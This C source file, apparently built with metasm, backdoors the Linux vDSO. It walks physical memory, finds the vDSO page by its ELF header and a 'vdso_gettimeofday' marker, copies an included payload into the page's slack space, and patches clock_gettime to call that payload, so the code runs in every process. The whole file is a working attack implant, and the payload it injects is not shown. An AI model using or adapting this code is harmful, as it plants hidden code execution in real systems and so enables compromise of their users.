/* This code is meant to be compiled by metasm, hence the few strangenesses. */

#define NULL	(void *)0
#define false	0
#define true	1

typedef unsigned long size_t;
typedef unsigned int uint32_t;
typedef unsigned long long uint64_t;
typedef int bool;
typedef unsigned long ULONG;
typedef unsigned short USHORT;
typedef unsigned char UCHAR;

/******************************************************************************/

#include "payload.h"

#define PATTERN1		0x55AA55AA
#define PATTERN2		0xAA55AA55

#define PAGE_SIZE		4096
#define ELF_HEADER		"\x7f\x45\x4c\x46\x02\x01\x01\x00"


static int memcmp(const void *s1, const void *s2, size_t n)
{
	unsigned char u1, u2;

	for ( ; n-- ; s1++, s2++) {
		u1 = *(unsigned char *)s1;
		u2 = *(unsigned char *)s2;
		if (u1 != u2)
			return u1 - u2;
	}

	return 0;
}

static void *memcpy(void *dest, const void *src, size_t n)
{
	const unsigned char *s;
	unsigned char *d;

	d = dest;
	s = src;
	while (n-- > 0)
		*d++ = *s++;

	return dest;
}

/* the 2 physical pages of vdso are consecutive */
static void backdoor_vdso(void *addr)
{
	uint32_t clock_gettime_offset, value;
	uint64_t entry_point;
	unsigned char *p;

	/* e_entry */
	p = addr;
	entry_point = *(uint64_t *)(p + 0x18);
	clock_gettime_offset = (uint32_t)entry_point & 0xfff;

	/* put payload at the end of vdso */
	p = addr;
	p += PAGE_SIZE * 2;
	p -= sizeof(payload_o);
	memcpy(p, payload_o, payload_o_len);

	/* hijack clock_gettime */
	value = PAGE_SIZE * 2 - payload_o_len - clock_gettime_offset;
	p = addr;
	p += clock_gettime_offset;
	*p++ = '\x90'; // nop
	*p++ = '\xe8'; // call
	*(uint32_t *)p = value - 6;
}

static int is_vdso(void *addr)
{
	unsigned char *p;
	bool found;
	int i;

	if (memcmp(addr, ELF_HEADER, sizeof(ELF_HEADER)-1) != 0)
		return 0;

	p = addr;
	found = false;
	for (i = 0; i < PAGE_SIZE - 18; i++) {
		if (memcmp(p, "vdso_gettimeofday\x00", 18) == 0) {
			found = true;
			break;
		}
		p++;
	}

	if (!found)
		return 0;

	return 1;
}

int walk_memory(void)
{
	register ULONG *mem;
	ULONG  mem_count, a;
	USHORT memkb;
	bool found;

	__asm__ __volatile__ ("wbinvd");

	found = false;
	mem_count = 0;
	memkb = 0;
	do {
		memkb++;
		mem_count += 1024*1024;
		mem = (ULONG *)mem_count;

		a= *mem;
		*mem = PATTERN1;

		// the empty asm calls tell gcc not to rely on what's in its
		// registers as saved variables (this avoids GCC optimisations)
		//asm("":::"memory");

		if (*mem != PATTERN1) {
			mem_count = 0;
		} else {
			*mem = PATTERN2;
			//asm("":::"memory");
			if (*mem != PATTERN2)
				mem_count = 0;
		}

		if (mem_count != 0) {
			void *addr;
			int i;

			addr = (void *)mem_count;
			for (i = 0; i < (1024 * 1024) / PAGE_SIZE; i++) {
				if (is_vdso(addr)) {
					backdoor_vdso(addr);
					found = true;
				}

				addr += PAGE_SIZE;
			}
		}

		//asm("":::"memory");
		*mem = a;
	} while (memkb < 4096 && mem_count != 0);

	return found ? 0x1337 : 0xdead;
}
